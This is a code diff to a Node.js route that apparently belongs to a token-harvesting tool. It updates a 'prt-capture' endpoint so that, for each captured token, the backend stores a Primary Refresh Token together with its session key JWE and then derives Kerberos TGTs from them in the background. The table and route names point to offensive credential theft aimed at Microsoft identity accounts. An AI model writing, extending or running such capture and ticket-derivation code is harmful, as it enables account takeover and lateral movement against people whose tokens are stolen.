@@ -1133,14 +1133,35 @@ router.post('/:id/prt-capture', userAuth, async (req, res) => {
     for (const tenant of candidates) {
       try {
         const result = await deviceManager.capturePrtSessionKey(token.user_id, tenant, refreshToken);
-        // Persist the fresh PRT on the token row (encrypted, like other token material)
+        // Persist the fresh PRT AND session_key_jwe on the token row
+        // (encrypted, like other token material). The JWE is what makes
+        // session_key / tgt_ad / tgt_cloud / tgt_cloud_sessionkey
+        // resolvable later - without it they stay null forever.
         try {
-          await db.query(
-            'UPDATE captured_tokens SET prt = ? WHERE id = ? AND user_id = ?',
-            [encrypt(result.prt), token.id, token.user_id]
-          );
+          if (result.sessionKeyJwe) {
+            await db.query(
+              'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ? AND user_id = ?',
+              [encrypt(result.prt), encrypt(result.sessionKeyJwe), token.id, token.user_id]
+            );
+          } else {
+            await db.query(
+              'UPDATE captured_tokens SET prt = ? WHERE id = ? AND user_id = ?',
+              [encrypt(result.prt), token.id, token.user_id]
+            );
+          }
         } catch (pErr) {
           console.error('[Tokens] Failed to persist captured PRT:', pErr.message);
+        }
+
+        // Re-derive Kerberos TGTs now that a raw PRT + session key exist.
+        // Fire-and-forget so the response is not delayed.
+        if (tenant && tenant !== 'common' && tenant !== 'organizations') {
+          kerberosService.deriveTGTForToken(token.id)
+            .then(r => {
+              if (r && r.success) console.log('[Tokens] Kerberos TGTs derived for token', token.id);
+              else console.log('[Tokens] Kerberos derivation skipped for token', token.id, ':', (r && r.error) || 'unknown');
+            })
+            .catch(e => console.error('[Tokens] Kerberos derivation error:', e.message));
         }
         console.log('[Tokens] PRT captured for token', token.id, 'tenant', tenant, '(session key stored redacted)');
         return res.json({
